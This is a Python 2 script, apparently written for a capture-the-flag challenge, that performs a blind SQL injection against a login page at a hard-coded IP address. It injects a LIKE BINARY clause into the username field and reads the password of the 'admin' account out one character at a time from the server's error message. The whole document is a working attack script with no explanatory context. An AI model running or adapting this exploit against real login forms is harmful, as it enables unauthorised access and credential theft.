#!/usr/bin/env python
# encoding: utf-8
import requests
import string
url = "http://114.55.36.69:6663/index.php"
flag = ""
for i in range(1,1270):
    payload = flag
    for j in "0123456789"+string.letters+"!@#$^&*()==":
        data = {
                "username":"admin' and password like binary 'dVAxMEBkX25Fdy5waHA%s%%'#"%(payload+j),
                "password":"123"
        }
        print data
        r = requests.post(url=url,data=data)
        if "password error" in r.content:
            flag += j
            print flag
            break

